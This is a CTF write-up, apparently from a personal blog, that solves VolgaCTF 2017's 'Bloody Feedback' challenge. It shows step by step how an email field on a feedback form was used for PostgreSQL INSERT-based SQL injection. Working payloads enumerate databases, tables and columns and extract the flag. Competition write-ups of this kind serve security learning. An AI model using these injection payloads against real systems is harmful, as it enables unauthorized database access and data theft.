{"data":{"markdownRemark":{"html":"<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Bloody Feedback\n\nSend your feedback at bloody-feedback.quals.2017.volgactf.ru\n\nDO. NOT. USE. SQLMAP\nOtherwise your IP will be banned</code></pre></div>\n<p>The challenge basically has two functions, 1) Send feedback and 2) view the status of the sent feedback. There is also page that cotains \"Top Messages\" which is the feedback people send in. When you send feedback you get a token back which you can use to see if the feedback has been processed or not.</p>\n<p>I first tried to steal cookies via the feedback form but it turned out that everything was filtered. My second try involved finding a SQL injection vulnerability at the feedback status page:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">http://bloody-feedback.quals.2017.volgactf.ru/check/?code=&lt;token here&gt;</code></pre></div>\n<p><a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/7469139a6a6ed98a052c48ff52caa0eb/7264e/not_processed.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-wrapper\"\n    style=\"position: relative; display: block;  max-width: 850px; margin-left: auto; margin-right: auto;\"\n  >\n    <span\n      class=\"gatsby-resp-image-background-image\"\n      style=\"padding-bottom: 18.732782369146005%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAh0lEQVQY05XQTQ7CIBAFYG5SCP9DrMKOVLStxHv0FI038bZPy8olLr68zGImL8NKKZimK3LOMMaADwME5w3/kxACLIQAIoL3Hs45WEcwPsB6anOvY18pBbasKx61on4t84z7tuO5v3HbXricR8QYu6SUYK0FOy77n4YunEBjbKm1bm/oJaXEB3tAeNHXwpuJAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n    ></span>\n    <img\n        class=\"gatsby-resp-image-image\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;box-shadow:inset 0px 0px 0px 400px white;\"\n        alt=\"not_processed\"\n        title=\"\"\n        src=\"/static/7469139a6a6ed98a052c48ff52caa0eb/06bbf/not_processed.png\"\n        srcset=\"/static/7469139a6a6ed98a052c48ff52caa0eb/6b538/not_processed.png 213w,\n/static/7469139a6a6ed98a052c48ff52caa0eb/3c081/not_processed.png 425w,\n/static/7469139a6a6ed98a052c48ff52caa0eb/06bbf/not_processed.png 850w,\n/static/7469139a6a6ed98a052c48ff52caa0eb/7264e/not_processed.png 1089w\"\n        sizes=\"(max-width: 850px) 100vw, 850px\"\n      />\n  </span>\n  </a></p>\n<p>I got nothing, the only thing I could deduce was that every feedback sent, had a default status of \"not processed\". I assumed this would change after a while but it never did.</p>\n<p>My next attempt was to intercept the POST submission from the feedback form with burp to see if any parameters were vulnerable. By entering <code class=\"language-text\">lol&#39;</code> as email, the following error was triggered:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">&lt;div class=&quot;container&quot;&gt;\n&lt;div class=&quot;page-header&quot;&gt;\n&lt;h2&gt;Error&lt;/h2&gt;\n&lt;/div&gt;\n&lt;div class=&quot;alert alert-danger&quot;&gt;\n\t&lt;p&gt;ERROR: DBD::Pg::db do failed: ERROR:  syntax error at or near &quot;not&quot;\n\tLINE 1: ...HRkIBBUOq9M40ZqvsB1TcwWVWt&#39;,&#39;smacker&#39;,&#39;m&#39;,&#39;lol&#39;&#39;,&#39;not proces...\n\t                                                 ^ at Worker.pm line 29.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;</code></pre></div>\n<p>I realised that when you send your feedback, the program automatically inserts \"not processed\" along with the feedback. My working theory at ths point was to substitute the \"not processed\" field with an SQL query of my choosing. After a few tries I constructed the following query:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">name=smacker&amp;message=m&amp;email=lol&#39;,(select version()))--</code></pre></div>\n<p>However I got an error message indicating that the field allows a maximum of 30 chars, so I simply added substring():</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">name=smacker&amp;message=m&amp;email=lol&#39;,(select substr(version(),0,30)))--</code></pre></div>\n<p><a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/5a08ff578aced10b4022fa19be0c71aa/6e32a/postgres.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-wrapper\"\n    style=\"position: relative; display: block;  max-width: 850px; margin-left: auto; margin-right: auto;\"\n  >\n    <span\n      class=\"gatsby-resp-image-background-image\"\n      style=\"padding-bottom: 18.59205776173285%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAeklEQVQI12Ows7OztbW1sLBQUVFWVFBUUiQWKCkpMejq6mqBgYa6upq6BjLCD5SVlRkcHR2dnZ1dXVwcnJyd0urdSyY55fe65Pc6F00ycfQy0NMxNDIyxAAGBgYqKioMWjCgCcR6htoGxlr6EGSirqGlpqaqhgMAbQYA9MUrTIj6Jp0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n    ></span>\n    <img\n        class=\"gatsby-resp-image-image\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;box-shadow:inset 0px 0px 0px 400px white;\"\n        alt=\"not_processed\"\n        title=\"\"\n        src=\"/static/5a08ff578aced10b4022fa19be0c71aa/06bbf/postgres.png\"\n        srcset=\"/static/5a08ff578aced10b4022fa19be0c71aa/6b538/postgres.png 213w,\n/static/5a08ff578aced10b4022fa19be0c71aa/3c081/postgres.png 425w,\n/static/5a08ff578aced10b4022fa19be0c71aa/06bbf/postgres.png 850w,\n/static/5a08ff578aced10b4022fa19be0c71aa/6e32a/postgres.png 1108w\"\n        sizes=\"(max-width: 850px) 100vw, 850px\"\n      />\n  </span>\n  </a></p>\n<p>Now when I checked the status page of my feedback with the token I got, instead of seeing \"not processed\", I saw <code class=\"language-text\">PostgreSQL 9.5.6 on x86_64-pc</code>. Now I knew how to display my SQL queries on the site, by overwriting the \"not processed\" field.</p>\n<p>So I tried a few other things:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">user = fcgi_user         =&gt;  name=smacker&amp;message=m&amp;email=lol&#39;,(select substr(user,0,30)))--\ndatabase = feedback_db   =&gt;  name=smacker&amp;message=m&amp;email=lol&#39;,(select substr(current_database(),0,30)))--</code></pre></div>\n<p>Since the field can't hold multiple rows/values, I had to use LIMIT X OFFSET Y in order to step through each element in the set that the database returned. The following code snippets shows how I enumerated the database to find the flag.</p>\n<p><strong>Databases:</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">postgres =&gt; name=smacker&amp;message=m&amp;email=lol&#39;,(select substr(datname ,0,30) FROM pg_database LIMIT 1 OFFSET 1))--\ntemplate1 =&gt; name=smacker&amp;message=m&amp;email=lol&#39;,(select substr(datname ,0,30) FROM pg_database LIMIT 1 OFFSET 2))--\nfeedback_db =&gt; name=smacker&amp;message=m&amp;email=lol&#39;,(select substr(datname ,0,30) FROM pg_database LIMIT 1 OFFSET 3))--</code></pre></div>\n<p><strong>TABLES:</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">s3cret_tabl3 =&gt; name=smacker&amp;message=m&amp;email=lol&#39;,(select table_name FROM information_schema.tables WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 1))--</code></pre></div>\n<p><strong>COLUMNS:</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">name =&gt;  name=smacker&amp;message=m&amp;email=lol&#39;,(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 1))--\nemail =&gt; name=smacker&amp;message=m&amp;email=lol&#39;,(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 2))--\nmessage =&gt; name=smacker&amp;message=m&amp;email=lol&#39;,(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 3))--\nstatus =&gt; name=smacker&amp;message=m&amp;email=lol&#39;,(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 4))--\nid =&gt; name=smacker&amp;message=m&amp;email=lol&#39;,(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 5))--\ns3cr3tc0lumn =&gt; name=smacker&amp;message=m&amp;email=lol&#39;,(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 6))--</code></pre></div>\n<p><strong>Time to get the rows from <code class=\"language-text\">s3cr3tc0lumn</code></strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">VolgaCTF =&gt; name=smacker&amp;message=m&amp;email=lol&#39;,(select s3cr3tc0lumn FROM s3cret_tabl3 LIMIT 1 OFFSET 1))--\nVolga =&gt; name=smacker&amp;message=m&amp;email=lol&#39;,(select s3cr3tc0lumn FROM s3cret_tabl3 LIMIT 1 OFFSET 2))--\n1 =&gt; name=smacker&amp;message=m&amp;email=lol&#39;,(select s3cr3tc0lumn FROM s3cret_tabl3 LIMIT 1 OFFSET 3))--\nVolgaCTF{eiU7UJhyeu@ud3*} =&gt; name=smacker&amp;message=m&amp;email=lol&#39;,(select s3cr3tc0lumn FROM s3cret_tabl3 LIMIT 1 OFFSET 4))--</code></pre></div>\n<p><a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/0bf70217ce675126d104f9faad79d902/9a39a/flag.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-wrapper\"\n    style=\"position: relative; display: block;  max-width: 850px; margin-left: auto; margin-right: auto;\"\n  >\n    <span\n      class=\"gatsby-resp-image-background-image\"\n      style=\"padding-bottom: 17.984934086629004%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAmUlEQVQY043PQQrCMAAEwPwkjZCkJFibiNKChRpDG/DmA3yCN4V+wXtBX7um0CqCqIdhD3tYljjnsKkq1HWNLMtAKQVjs4i9SZJB8hORUmIghHjh/ImPmabpX4j3Hk3ToA0BrXfYHo4I3R3h0qM999h3N+xOV5hVAZvnsNbCGPPR0BGlNfREKaj5AnpZRsWohDJryLg+vfnmAQLTfEA/6l9tAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n    ></span>\n    <img\n        class=\"gatsby-resp-image-image\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;box-shadow:inset 0px 0px 0px 400px white;\"\n        alt=\"not_processed\"\n        title=\"\"\n        src=\"/static/0bf70217ce675126d104f9faad79d902/06bbf/flag.png\"\n        srcset=\"/static/0bf70217ce675126d104f9faad79d902/6b538/flag.png 213w,\n/static/0bf70217ce675126d104f9faad79d902/3c081/flag.png 425w,\n/static/0bf70217ce675126d104f9faad79d902/06bbf/flag.png 850w,\n/static/0bf70217ce675126d104f9faad79d902/9a39a/flag.png 1062w\"\n        sizes=\"(max-width: 850px) 100vw, 850px\"\n      />\n  </span>\n  </a></p>\n<p><strong>Flag: VolgaCTF{eiU7UJhyeu@ud3*}</strong></p>","timeToRead":4,"excerpt":"The challenge basically has two functions, 1) Send feedback and 2) view the status of the sent feedback. There is also page that cotains…","frontmatter":{"title":"VolgaCTF - Bloody Feedback writeup","slug":"volgactf-bloody-feedback-writeup","date":"2017-03-28T00:00:00.000Z","categories":["CTF Writeup"],"tags":["CTF Writeup"],"template":"post"},"fields":{"nextTitle":"Chalmers CTF","nextSlug":"/chalmers-ctf/","prevTitle":"VolgaCTF - Share Point writeup","prevSlug":"/volgactf-share-point-writeup/","slug":"/volgactf-bloody-feedback-writeup/","date":"2017-03-28T00:00:00.000Z"}}},"pageContext":{"slug":"/volgactf-bloody-feedback-writeup/"}}